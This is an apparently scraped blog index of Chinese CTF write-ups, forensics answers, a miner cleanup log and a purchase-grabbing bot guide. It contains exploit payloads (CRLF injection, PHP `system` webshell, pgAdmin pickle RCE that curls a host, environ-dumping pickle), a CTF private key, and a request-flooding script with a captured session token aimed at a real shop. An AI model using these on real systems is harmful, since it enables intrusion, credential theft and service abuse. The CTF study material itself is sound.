nullcon_HackIM_CTF_Berlin","uri":"/2024nullcon_hackim_ctf_berlin/#traversaller"},{"categories":["web","wp"],"content":"\r[executy] \u003c?php ini_set(\"error_reporting\", 0); if(isset($_GET['source'])) { highlight_file(__FILE__); } include \"flag.php\"; # From: https://stackoverflow.com/questions/2040240/php-function-to-generate-v4-uuid/15875555#15875555 function format_uuidv4($data) { assert(strlen($data) == 16); $data[6] = chr(ord($data[6]) \u0026 0x0f | 0x40); // set version to 0100 $data[8] = chr(ord($data[8]) \u0026 0x3f | 0x80); // set bits 6-7 to 10 return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4)); } $THE_SCRIPT = \u003c\u003c\u003cSCRIPT #!/bin/sh cat flag.txt; SCRIPT; if(isset($_POST['executy'])) { $executy = trim($_POST['executy']); try { if(strlen($executy) \u003e 1024) { throw new Exception(\"Too long\"); } if($executy == $THE_SCRIPT) { throw new Exception(\"Nope, this is too easy!\"); } $fname = \"/tmp/\" . format_uuidv4(random_bytes(16)) . \".sh\"; $ret = file_put_contents($fname, $executy); if(!$ret) { throw new Exception(\"Nope\"); } `ulimit -Sn 10000;ulimit -Hn 50000;screen -Dm -- bash -c \"cat $fname; screen -X hardcopy -h $fname.out\"`; $fcontent = trim(file_get_contents($fname . \".out\")); if($fcontent != $THE_SCRIPT) { echo \"I'm not allowed to execute other files :-(\"; throw new Exception(\"Nope\"); } echo `timeout 1s bash $fname 2\u003e\u00261`; } catch(Exception $e) { echo \"An error occured!\" . $e; } @unlink($fname); @unlink($fname . \".out\"); } ?\u003e 输入的 bash 命令将被检查是否与$THE SCRIPT 变量中的内容匹配。如果不同，那么命令不会被执行。 根据下半部分源码可知，我们输入的 bash 命令并没有直接与 $THE_SCRIPT 变量进行比较。相反，它是使用硬拷贝屏幕捕获的。 可以发起 CLRF攻击 payload %23%21%2Fbin%2Fsh%0Acat%20*%20#%0Dcat+flag.txt%3B ","date":"2024-04-01","objectID":"/2024nullcon_hackim_ctf_berlin/:1:6","series":null,"tags":["web","wp"],"title":"2024 nullcon_HackIM_CTF_Berlin","uri":"/2024nullcon_hackim_ctf_berlin/#executy"},{"categories":["wp"],"content":"真遗憾今年没抽到贴纸 ","date":"2024-03-24","objectID":"/2024nkctf/:0:0","series":null,"tags":["wp"],"title":"2024 NKCTF","uri":"/2024nkctf/#"},{"categories":["wp"],"content":"\rweb","date":"2024-03-24","objectID":"/2024nkctf/:1:0","series":null,"tags":["wp"],"title":"2024 NKCTF","uri":"/2024nkctf/#web"},{"categories":["wp"],"content":"\r[my first cms]考点cve cms made simple 2.2.19 GitHub - capture0x/CMSMadeSimple 后台扫描发现登录页面/admin/login.php 弱口令admin/Admin123 命令执行： \u003c?php echo system('cat /_fffff1@g'); ?\u003e ","date":"2024-03-24","objectID":"/2024nkctf/:1:1","series":null,"tags":["wp"],"title":"2024 NKCTF","uri":"/2024nkctf/#my-first-cms"},{"categories":["wp"],"content":"\r[attack_tacooooo]tacooooo@qq.com/tacooooo登录pgadmin4 右下角有提示 搜索pgadmin4.8.3的漏洞得到 CVE-2024-2044 参考： https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/ import struct import sys def produce_pickle_bytes(platform, cmd): b = b'\\x80\\x04\\x95' b += struct.pack('L', 22 + len(platform) + len(cmd)) b += b'\\x8c' + struct.pack('b', len(platform)) + platform.encode() b += b'\\x94\\x8c\\x06system\\x94\\x93\\x94' b += b'\\x8c' + struct.pack('b', len(cmd)) + cmd.encode() b += b'\\x94\\x85\\x94R\\x94.' print(b) return b if __name__ == '__main__': with open('posix.pickle', 'wb') as f: f.write(produce_pickle_bytes('posix', f\"curl http://{HOST}/\")) 根据流程改cookie值可以反弹shell随后在crontab -e得到flag 赛后看到另外一个师傅写的script： 流程跟上面的差不多，改完cookie在文件管理里面有1.txt得到flag import struct import sys import pickle import base64 class A(object): def __reduce__(self): return (eval,(\"__import__('os').system('cat /proc/1/environ \u003e /var/lib/pgadmin/storage/tacooooo_qq.com/1.txt')\",)) poc = A() result = pickle.dumps(poc) if __name__ == '__main__': with open('C:\\\\Users\\\\scofi\\\\Desktop\\\\posix.pickle', 'wb') as f: f.write(result) NKCTF2024-WEB-gxngxngxn - gxngxngxn - 博客园 (cnblogs.com) ","date":"2024-03-24","objectID":"/2024nkctf/:1:2","series":null,"tags":["wp"],"title":"2024 NKCTF","uri":"/2024nkctf/#attack_tacooooo"},{"categories":["wp"],"content":"\rmisc","date":"2024-03-24","objectID":"/2024nkctf/:2:0","series":null,"tags":["wp"],"title":"2024 NKCTF","uri":"/2024nkctf/#misc"},{"categories":["wp"],"content":"\r[signin]base解码公众号回复 ","date":"2024-03-24","objectID":"/2024nkctf/:2:1","series":null,"tags":["wp"],"title":"2024 NKCTF","uri":"/2024nkctf/#signin"},{"categories":["wp"],"content":"\r[Webshell_pro]流量分析，请求流量是经过加密的，响应包流量可以通过base解码 在tcp流9得到请求体的加密代码 把加密逆向得到明文，以此对请求包的shell参数进行解密 import base64 import libnum from Crypto.PublicKey import RSA pubkey = \"\"\"-----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCK/qv5P8ixWjoFI2rzF62tm6sDFnRsKsGhVSCuxQIxuehMWQLmv6TPxyTQPefIKufzfUFaca/YHkIVIC19ohmE5X738TtxGbOgiGef4bvd9sU6M42k8vMlCPJp1woDFDOFoBQpr4YzH4ZTR6Ps+HP8VEIJMG5uiLQOLxdKdxi41QIDAQAB -----END PUBLIC KEY----- \"\"\" prikey = \"\"\"-----BEGIN PRIVATE KEY----- MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAIr+q/k/yLFaOgUjavMXra2bqwMWdGwqwaFVIK7FAjG56ExZAua/pM/HJNA958gq5/N9QVpxr9geQhUgLX2iGYTlfvfxO3EZs6CIZ5/hu932xTozjaTy8yUI8mnXCgMUM4WgFCmvhjMfhlNHo+z4c/xUQgkwbm6ItA4vF0p3GLjVAgMBAAECgYBDsqawT5DAUOHRft6oZ+//jsJMTrOFu41ztrKkbPAUqCesh+4R1WXAjY4wnvY1WDCBN5CNLLIo4RPuli2R81HZ4OpZuiHv81sNMccauhrJrioDdbxhxbM7/jQ6M9YajwdNisL5zClXCOs1/y01+9vDiMDk0kX8hiIYlpPKDwjqQQJBAL6Y0fuoJng57GGhdwvN2c656tLDPj9GRi0sfeeMqavRTMz6/qea1LdAuzDhRoS2Wb8ArhOkYns0GMazzc1q428CQQC6sM9OiVR4EV/ewGnBnF+0p3alcYr//Gp1wZ6fKIrFJQpbHTzf27AhKgOJ1qB6A7P/mQS6JvYDPsgrVkPLRnX7AkEAr/xpfyXfB4nsUqWFR3f2UiRmx98RfdlEePeo9YFzNTvX3zkuo9GZ8e8qKNMJiwbYzT0yft59NGeBLQ/eynqUrwJAE6Nxy0Mq/Y5mVVpMRa+babeMBY9SHeeBk22QsBFlt6NT2Y3Tz4CeoH547NEFBJDLKIICO0rJ6kF6cQScERASbQJAZy088sVY6DJtGRLPuysv3NiyfEvikmczCEkDPex4shvFLddwNUlmhzml5pscIie44mBOJ0uX37y+co3q6UoRQg== -----END PRIVATE KEY----- \"\"\" pubkey = RSA.import_key(pubkey) prikey = RSA.import_key(prikey) n = pubkey.n def decrypt(cipher_text): # 首先，将enc_replace函数中的编码反转 cipher_text = cipher_text.replace(\"JXWUDuLUgwRLKD9fD6\u0026VY2aFeE\u0026r@Ff2\", \"=\") cipher_text = cipher_text.replace(\"n6\u0026B8G6nE@2tt4UR6h3QBt*5\u0026C\u0026pVu8W\", \"+\") cipher_text = cipher_text.replace(\"e5Lg^FM5EQYe5!yF\u002662%V$UG*B*RfQeM\", \"/\") # 然后，解码base64字符串 cipher_text = base64.b64decode(cipher_text) # 使用公钥解密 plain_text = b\"\" for i in range(0, len(cipher_text), 128): part = cipher_text[i:i + 128] dec = libnum.n2s(pow(libnum.s2n(part), pubkey.e, n)) plain_text += dec return plain_text if __name__ == '__main__': c = \"G1TUg4bIVOFYi8omV2SQrTa8fzYfboRNN7fV6FJn6\u0026B8G6nE@2tt4UR6h3QBt*5\u0026C\u0026pVu8Wbm3O74uCUbwMkvRCYae44TX1ZO8X4w2Nk1igaIZjSQIJ9MMHhD9cn6\u0026B8G6nE@2tt4UR6h3QBt*5\u0026C\u0026pVu8WSV5EzikNsyM5c1nlPS8uqw1P2pJuYLaLxloK0x5xhQHDqqAxkuKrBzPn0noQ2bDn6\u0026B8G6nE@2tt4UR6h3QBt*5\u0026C\u0026pVu8WlVnGwsfP7YP9PYJXWUDuLUgwRLKD9fD6\u0026VY2aFeE\u0026r@Ff2\" decrypted_data = decrypt(c) print(f\"解密后的数据: {decrypted_data}\") 得到新的密文 U2FsdGVkX1+SslS2BbHfe3c4/t/KxLaM6ZFlOdbtfMHnG8lepnhMnde40tNOYjSvoErLzy0csL7c5d4TlMntBQ== 经过两次对tcp流8的解码，得到 PASSWORD: Password-based-encryption aes解密得到flag https://www.sojson.com/encrypt_aes.html ","date":"2024-03-24","objectID":"/2024nkctf/:2:2","series":null,"tags":["wp"],"title":"2024 NKCTF","uri":"/2024nkctf/#webshell_pro"},{"categories":["script"],"content":"拼谷助手这个QQ小程序在电脑端访问会参数错误，只能用手机端进行访问，需要用bp对手机流量进行抓包 ","date":"2024-03-23","objectID":"/script_for_goods/:0:0","series":null,"tags":["script"],"title":"《拼谷助手》抢谷子脚本","uri":"/script_for_goods/#"},{"categories":["script"],"content":"\r使用burpsuite抓取手机app流量前提条件： 电脑和手机连接同一个WIFI，即同一个局网下 电脑装有burpsuit软件 安卓手机（也可以使用安卓模拟器） ","date":"2024-03-23","objectID":"/script_for_goods/:1:0","series":null,"tags":["script"],"title":"《拼谷助手》抢谷子脚本","uri":"/script_for_goods/#使用burpsuite抓取手机app流量"},{"categories":["script"],"content":"\rPC端配置电脑开一下热点，用手机连上 然后在终端输入ipconfig记录一下热点局域网网卡ip 然后在burpsuite中添加代理设置 随后勾选代理，同时把本地的127.0.0.1代理取消即可，然后导出CA证书 导出证书后，把证书文件CA.crt传到手机里，在手机里安装bp的证书 ","date":"2024-03-23","objectID":"/script_for_goods/:1:1","series":null,"tags":["script"],"title":"《拼谷助手》抢谷子脚本","uri":"/script_for_goods/#pc端配置"},{"categories":["script"],"content":"\r手机端配置手机【设置】–【更多设置】–【安全】–【从手机U盘和SD卡安装】 或者直接在设置中搜索证书，选择安装证书 然后用手机连接电脑的热点信号，并在代理设置手动，添加在电脑端查到的热点网卡地址，端口跟起初在bp中绑定的端口相同，这里为8081 ","date":"2024-03-23","objectID":"/script_for_goods/:1:2","series":null,"tags":["script"],"title":"《拼谷助手》抢谷子脚本","uri":"/script_for_goods/#手机端配置"},{"categories":["script"],"content":"\rPC端burpsuite抓包随后在burpsuite就可以看到手机的流量 在代理模块可以抓包拦截 ","date":"2024-03-23","objectID":"/script_for_goods/:1:3","series":null,"tags":["script"],"title":"《拼谷助手》抢谷子脚本","uri":"/script_for_goods/#pc端burpsuite抓包"},{"categories":["script"],"content":"\r开始抢谷子开启拦截，在手机端打开拼谷助手 （将无关的数据包通通放行即可，直到我们要抓取的流量包） ","date":"2024-03-23","objectID":"/script_for_goods/:2:0","series":null,"tags":["script"],"title":"《拼谷助手》抢谷子脚本","uri":"/script_for_goods/#开始抢谷子"},{"categories":["script"],"content":"\r抓取get_goods_info到主页面，点击我们将要抢的谷子 一路放行，直到出现这个流量包，鼠标右键–\u003e拦截–\u003e该请求的响应 然后一路放行，直到出现对应请求包的响应包，如下 我们需要从上述相应包中提取关键参数，修改到下单post包 ","date":"2024-03-23","objectID":"/script_for_goods/:2:1","series":null,"tags":["script"],"title":"《拼谷助手》抢谷子脚本","uri":"/script_for_goods/#抓取get_goods_info"},{"categories":["script"],"content":"\r关于另外三个字段的信息 ownerUserId，ownerUserId_和createUserId_ ownerUserId和ownerUserId_除了下单的post包之外是抓不到的，而且ownerUserId_和createUserId_值是相同的。由于在同一个拼谷团中，发布谷子的团长不变，所以在同一个团中，每个谷子下单post包中，这三个键的值是固定不变的，经过测试，需要在同一个团中下单一次谷子（无论强没抢到，只要抓到下单post包即可），拿到下单post包中的这三个键的信息，就可以在这个团中一直抢谷子。 ","date":"2024-03-23","objectID":"/script_for_goods/:2:2","series":null,"tags":["script"],"title":"《拼谷助手》抢谷子脚本","uri":"/script_for_goods/#关于另外三个字段的信息"},{"categories":["script"],"content":"\r修改下单post包测试的时候抓到的下单post包，可以直接用： POST /web?env=pro-2gis2vsrb5a3b312 HTTP/2 Host: tcb-api.tencentcloudapi.com Referer: https://appservice.qq.com/1112117769/1.25.1/page-frame.html User-Agent: Mozilla%2F5.0+%28Linux%3B+Android+13%3B+22041216C+Build%2FTP1A.220624.014%3B+wv%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Version%2F4.0+Chrome%2F122.0.6261.119+Mobile+Safari%2F537.36 QQ/9.0.15.14970 V1_AND_SQ_9.0.15_5626_YYB_D QQ/MiniApp Content-Type: application/json;charset=UTF-8 X-Sdk-Version: tcb-qq-sdk/1.0.3 Content-Length: 836 Accept-Encoding: gzip, deflate, br {\"action\":\"functions.invokeFunction\",\"loginType\":\"QQ-MINI\",\"ticket\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoie1wiZW52SWRcIjpcInByby0yZ2lzMnZzcmI1YTNiMzEyXCIsXCJxcUFwcElkXCI6XCIxMTEyMTE3NzY5XCIsXCJvcGVuSWRcIjpcIjkxRDdBMDM3OTUzNTQxQ0RGOUI5QTMzOTZBOUQ4RTQ5XCIsXCJ1dWlkXCI6XCI0NDU0ZWI4ZTYxMjE0YmIyODliMTlmMDA2M2RiYTZlYVwifSIsImlhdCI6MTcxMTIwODk5OSwiZXhwIjoxNzExMjE2MTk5fQ.QphmoffNQbsMWZbpOqNIwXXAtNGpC0aBHmEu7Bp5vaE\",\"env\":\"pro-2gis2vsrb5a3b312\",\"dataVersion\":\"2019-08-16\",\"function_name\":\"addOrder\",\"request_data\":\"{\\\"createUserId_\\\":\\\"79069e4330504574a5b9a3126ca23cc9\\\",\\\"groupId\\\":\\\"T332000312\\\",\\\"goodsId\\\":\\\"G3320003121711206852431WTEXN\\\",\\\"ownerUserId\\\":\\\"7859292733\\\",\\\"ownerUserId_\\\":\\\"79069e4330504574a5b9a3126ca23cc9\\\",\\\"source\\\":\\\"own\\\",\\\"orderList\\\":[{\\\"itemId\\\":\\\"30a628b6235c46e9a8b7e15fd42fdbb0\\\",\\\"orderNum\\\":1}]}\"} 对照刚抓到的谷子的get_group_info响应包和get_goods_info相应包，需要修改下单post包请求体中以下参数 { \\\"createUserId_\\\":\\\"79069e4330504574a5b9a3126ca23cc9\\\", \\\"groupId\\\":\\\"T332000312\\\", \\\"goodsId\\\":\\\"G3320003121711206852431WTEXN\\\", \\\"ownerUserId\\\":\\\"7859292733\\\", \\\"ownerUserId_\\\":\\\"79069e4330504574a5b9a3126ca23cc9\\\", \\\"source\\\":\\\"own\\\", \\\"orderList\\\":[{\\\"itemId\\\":\\\"30a628b6235c46e9a8b7e15fd42fdbb0\\\", \\\"orderNum\\\":1}]}\" } （ownerUserId和ownerUserId_在get_group_info响应包，其他的都在get_goods_info响应包） ","date":"2024-03-23","objectID":"/script_for_goods/:2:3","series":null,"tags":["script"],"title":"《拼谷助手》抢谷子脚本","uri":"/script_for_goods/#修改下单post包"},{"categories":["script"],"content":"\rintruder发包测试请求体改好之后放入intruder模块进行测试 清除payload，并在payload选项中，payload类型选择null，无限重复 改好之后点击右上角开始攻击，进行测试 在intruder模块中点击响应，在回显体中如果有拼谷未开始字符，则说明测试成功，可以抢谷 ","date":"2024-03-23","objectID":"/script_for_goods/:2:4","series":null,"tags":["script"],"title":"《拼谷助手》抢谷子脚本","uri":"/script_for_goods/#intruder发包测试"},{"categories":["script"],"content":"\r正式开抢测试成功之后，等到要抢的谷子即将开始之前，点击开始攻击，就可以抢谷，为防止发包量过多，可以等到谷子开放开始三秒左右就点暂停 ","date":"2024-03-23","objectID":"/script_for_goods/:3:0","series":null,"tags":["script"],"title":"《拼谷助手》抢谷子脚本","uri":"/script_for_goods/#正式开抢"},{"categories":["script"],"content":"\r总结开始抢谷子流程总结一下就是：①放行无关流量包②抓到必要参数③intruder发包 因为每个谷子的itemid等参数不同，所以每次抢新谷子都要走一遍开始抢谷子环节来修改下单post包的请求体 将信息改入以下python脚本，当抢到谷子，脚本自动停止执行 XXX位置需要手动填入数据 import sys import json import requests import re while True: data = {'action': 'functions.invokeFunction', 'loginType': 'QQ-MINI', 'ticket': 'XXX', 'env': 'pro-2gis2vsrb5a3b312', 'dataVersion': '2019-08-16', 'function_name': 'addOrder', 'request_data': \"{\\\"createUserId_\\\":\\\"XXX\\\",\\\"groupId\\\":\\\"XXX\\\",\\\"goodsId\\\":\\\"XXX\\\",\\\"ownerUserId\\\":\\\"XXX\\\",\\\"ownerUserId_\\\":\\\"XXX\\\",\\\"source\\\":\\\"own\\\",\\\"orderList\\\":[{\\\"itemId\\\":\\\"XXX\\\",\\\"orderNum\\\":1}]}\" } headers = { 'Referer': 'https://appservice.qq.com/1112117769/1.25.1/page-frame.html', 'User-Agent': 'Mozilla%2F5.0+%28Linux%3B+Android+13%3B+22041216C+Build%2FTP1A.220624.014%3B+wv%29+AppleWebKit %2F537.36+%28KHTML%2C+like+Gecko%29+Version%2F4.0+Chrome%2F122.0.6261.119+Mobile+Safari%2F537.36 QQ/ 9.0.15.14970 V1_AND_SQ_9.0.15_5626_YYB_D QQ/MiniApp', 'Content-Type': 'application/json;charset=UTF-8', 'X-Sdk-Version': 'tcb-qq-sdk/1.0.3', 'Content-Length': '836', 'Accept-Encoding': 'gzip, deflate, br' } res = requests.post(\"https://tcb-api.tencentcloudapi.com/web?env=pro-2gis2vsrb5a3b312\", proxies={'http': \"http://127.0.0.1:8080\"}, data=json.dumps(data), headers=headers) data = res.json() json_data = json.loads(data['data']['response_data']) print(json_data) reg = str(json_data) if 'True' in reg: print('ok') sys.exit(0) ","date":"2024-03-23","objectID":"/script_for_goods/:4:0","series":null,"tags":["script"],"title":"《拼谷助手》抢谷子脚本","uri":"/script_for_goods/#总结"},{"categories":["Linux"],"content":"起因是服务器cpu占用过高，top得到陌生用户名和莫名其妙进程导致的高CPU占用，搜了一下进程名，发现是挖矿程序 查询此进程的网络连接情况，外连了矿池地址 /proc/目录下查找对应的pid号，找到kswapd0进程的详细信息 查看进程工作空间 检查test01定时任务 先crontab -e -u test01把挖矿进程的定时任务清除 然后find / -name kswapd0将查询出来的可疑文件强制删除 直接将可疑用户删除，同时递归删除用户目录userdel -rf test01 最后将kswapd0进程杀掉kill -9 136757，同时监控其是否复活 以类似的方法清除blitz64，进入/proc目录的相应进程号 进入/tmp/.X2k1-unix/，发现是.rsync文件夹和dota3.tar.gz文件 查了一下，rsync是挖矿木马的同步进程，dota3.tar.gz是亡命徒（Outlaw）挖矿僵尸网络第三版本的母体文件 Outlaw挖矿僵尸网络自2018年11月开始首次出现第零版本和后续的第零版本变种，利用Shellshock(CVE-2014-7169)漏洞、Drupalgeddon2漏洞（CVE-2018-7600）漏洞和SSH暴力破解进行传播，使用的攻击武器为自研后门程序Shellbot、扫描暴力破解工具Haiduc和隐藏进程工具XHide，主要攻击平台为Linux，还有少量IoT设备，释放挖矿程序，主要挖取以太币和门罗币。在2019年3月出现第一版本，主要使用SSH暴力破解进行传播，攻击武器有自研后门程序Shellbot和扫描暴力破解工具tsm，主要攻击平台为Linux以及IoT设备。2019年6月出现第二版本，该版本周期时间短，可用性不高，在分析时发现很多脚本均未成功执行，故猜测该版本很有可能是测试版本，除扫描暴力破解工具换成ps外，其它均与第一版本一致。2020年7月至今，均使用第三版本进行攻击，该版本功能丰富，工具齐全，经过几个版本迭代，已经非常成熟，这个版本也是至今为止存活最久的一个版本，使用工具和传播方式等与之前几个版本并无明显变化。 统统删掉，然后杀死进程blitz64 最后重启服务器，监控test01用户的可疑进程是否复活 ","date":"2024-03-17","objectID":"/once_linux_miner_emergency/:0:0","series":null,"tags":["Linux"],"title":"记一次Linux挖矿木马应急响应","uri":"/once_linux_miner_emergency/#"},{"categories":["Forensics"],"content":"流量分析与电子取证复现 ","date":"2024-03-13","objectID":"/2023longjian_online/:0:0","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#"},{"categories":["Forensics"],"content":"\rhard web考点：哥斯拉流量分析 ","date":"2024-03-13","objectID":"/2023longjian_online/:1:0","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#hard-web"},{"categories":["Forensics"],"content":"\rhard_web_1 服务器开放了哪些端口，请按照端口大小顺序提交答案，并以英文逗号隔开(如服务器开放了80 81 82 83端口则，答案为80,81,82,83) 180机对188机进行端口扫描的流量 根据tcp三次握手原理，过滤器： ip.dst == 192.168.162.188 and tcp.connection.synack flag{80,888,8888} ","date":"2024-03-13","objectID":"/2023longjian_online/:1:1","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#hard_web_1"},{"categories":["Forensics"],"content":"\rhard_web_2 服务器中根目录下的 flag 值是多少？ 过滤出访问192.168.162.180的HTTP流， ip.dst == 192.168.162.180 \u0026\u0026 http 追踪HTTP流 分析得到Godzilla连接密码为748007e861908c03，加密方式为AES， 随后 在010里面，将AES加密内容截取出来 赛博厨子解密 flag{9236b29d-5488-41e6-a04b-53b0d8276542} ","date":"2024-03-13","objectID":"/2023longjian_online/:1:2","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#hard_web_2"},{"categories":["Forensics"],"content":"\rhard_web_3 该webshell的连接密码是多少? https://www.somd5.com/ flag{14mk3y} ","date":"2024-03-13","objectID":"/2023longjian_online/:1:3","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#hard_web_3"},{"categories":["Forensics"],"content":"\rsevrer save考点：溯源取证 ","date":"2024-03-13","objectID":"/2023longjian_online/:2:0","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#sevrer-save"},{"categories":["Forensics"],"content":"\rsevrer_save_1 黑客是使用什么漏洞来拿下 root 权限的。格式为：CVE-2020-114514 过滤器：http 追踪tcp流，发现payload 搜索payload内容，得到flag{CVE-2022-22965} ","date":"2024-03-13","objectID":"/2023longjian_online/:2:1","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#sevrer_save_1"},{"categories":["Forensics"],"content":"\rsevrer_save_2 黑客反弹 shell 的 ip 和端口是什么，格式为：10.0.0.1:4444 综合流量包来看，攻击机地址为172.17.0.1，受害地址为172.17.0.1，同时发现流108为shell交互过程， 故flag{192.168.43.128:2333} 流106可见弹shell内容 ","date":"2024-03-13","objectID":"/2023longjian_online/:2:2","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#sevrer_save_2"},{"categories":["Forensics"],"content":"\rsevrer_save_3 黑客的病毒名称是什么？格式为：filename 将用户目录下的main文件丢入云沙箱，鉴定为病毒 ","date":"2024-03-13","objectID":"/2023longjian_online/:2:3","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#sevrer_save_3"},{"categories":["Forensics"],"content":"\rsevrer_save_4 黑客的病毒运行后创建了什么用户？请将回答用户名与密码：username:password shadow文件 flag{11:123456} ","date":"2024-03-13","objectID":"/2023longjian_online/:2:4","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#sevrer_save_4"},{"categories":["Forensics"],"content":"\rsevrer_save_5 服务器在被入侵时外网 ip 是多少? 格式为：10.10.0.1 flag{172.105.202.239} ","date":"2024-03-13","objectID":"/2023longjian_online/:2:5","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#sevrer_save_5"},{"categories":["Forensics"],"content":"\rsevrer_save_6 病毒运行后释放了什么文件？格式：文件 1,文件 2 将main放到云沙箱里检测 flag{lolMiner,mine_doge.sh} ","date":"2024-03-13","objectID":"/2023longjian_online/:2:6","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#sevrer_save_6"},{"categories":["Forensics"],"content":"\rsevrer_save_7 矿池地址是什么？格式：domain:1234 flag{doge.millpools.cc:5567} ","date":"2024-03-13","objectID":"/2023longjian_online/:2:7","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#sevrer_save_7"},{"categories":["Forensics"],"content":"\rsevrer_save_8 黑客的钱包地址是多少？格式：xx:xxxxxxxx 同上题图 flag{DOGE:DRXz1q6ys8Ao2KnPbtb7jQhPjDSqtwmNN9.lolMinerWorker} ","date":"2024-03-13","objectID":"/2023longjian_online/:2:8","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#sevrer_save_8"},{"categories":["Forensics"],"content":"\rez_web","date":"2024-03-13","objectID":"/2023longjian_online/:3:0","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#ez_web"},{"categories":["Forensics"],"content":"\rez_web_1 服务器自带的后门文件名是什么？（含文件后缀） 过滤器：http contains \"HTTP/1.1 200 OK\" 答案不对 flag{ViewMore.php} ","date":"2024-03-13","objectID":"/2023longjian_online/:3:1","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#ez_web_1"},{"categories":["Forensics"],"content":"\rez_web_2 服务器的内网 IP 是多少？ 虽然有好几个内网地址，正确答案是 flag{192.168.101.132} ","date":"2024-03-13","objectID":"/2023longjian_online/:3:2","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#ez_web_2"},{"categories":["Forensics"],"content":"\rez_web_3 攻击者往服务器中写入的 key 是什么？ 导出一个zip压缩包 追踪10098的http流 压缩包密码：7e03864b0db7e6f9 flag{7d9ddff2-2d67-4eba-9e48-b91c26c42337} ","date":"2024-03-13","objectID":"/2023longjian_online/:3:3","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#ez_web_3"},{"categories":["Forensics"],"content":"\rbaby_forensics","date":"2024-03-13","objectID":"/2023longjian_online/:4:0","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#baby_forensics"},{"categories":["Forensics"],"content":"\rbaby_forensics_1 磁盘中的 key 是多少？ 用过火眼的内存分析工具…….还是得volatility手搓 先filescan一下，然后把key文件dump下来 python vol.py -f baby_forensics.raw windows.filescan.FileScan | findstr key python vol.py -f baby_forensics.raw windows.dumpfiles.DumpFiles --physaddr 0x3df94070 得到文本，然后rot47一下（或者直接丢进随波逐流解码） thekeyis2e80307085fd2b5c49c968c323ee25d5 flag{2e80307085fd2b5c49c968c323ee25d5} ","date":"2024-03-13","objectID":"/2023longjian_online/:4:1","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#baby_forensics_1"},{"categories":["Forensics"],"content":"\rbaby_forensics_2 电脑中正在运行的计算器的运行结果是多少？ 获取所有进程信息，并找到clac.exe进程 python vol.py -f baby_forensics.raw windows.pslist.PsList \u003e\u003e pslist.txt 将内存文件下载下来 python vol.py -f /baby_forensics.raw windows.memmap.Memmap --pid 2844 --dump 然后后缀名改为.data放进GIMP分析 flag{7598632541} ","date":"2024-03-13","objectID":"/2023longjian_online/:4:2","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#baby_forensics_2"},{"categories":["Forensics"],"content":"\rbaby_forensics_3 该内存文件中存在的flag值是多少？ dump出来，用gimp还原图像 U2FsdGVkX195MCsw0ANs6/Vkjibq89YlmnDdY/dCNKRkixvAP6+B5ImXr2VIqBSp94qfIcjQhDxPgr9G4u++pA== 顺便dump并还原了exproler的画面 加密的key应该在这里面 然后去检索 python vol.py -f baby_forensics.raw windows.filescan.FileScan | findstr k3y 然后将其dump下来 python vol.py -f baby_forensics.raw windows.dumpfiles.DumpFiles --physaddr 0x3ef3a310 得到密钥qwerasdf 解密得到flag https://www.sojson.com/encrypt_aes.html flag{ad9bca48-c7b0-4bd6-b6fb-aef90090bb98} ","date":"2024-03-13","objectID":"/2023longjian_online/:4:3","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#baby_forensics_3"},{"categories":["Forensics"],"content":"\rWireshark 被入侵主机的 IP 是？ ","date":"2024-03-13","objectID":"/2023longjian_online/:5:0","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#wireshark"},{"categories":["Forensics"],"content":"\rWireshark_1\r只有两台机器在通信，根据流量走向可判断 flag{192.168.246.28} ","date":"2024-03-13","objectID":"/2023longjian_online/:5:1","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#wireshark_1"},{"categories":["Forensics"],"content":"\rWireshark_2 被入侵主机的口令是？ flag{youcannevergetthis} ","date":"2024-03-13","objectID":"/2023longjian_online/:5:2","series":null,"tags":["Forensics"],"title":"2023 第二届陇剑杯初赛","uri":"/2023longjian_online/#wireshark_2"},{"categories":["Forensics"],"content":"\rWireshark_3 用户目录下第二个文件夹的名称是？ flag{Downloads} ","date":"2024-03-13","objectID":"/2023longjian_online/:5:3","series":null,"tags":["Forensics"],"title":"2023 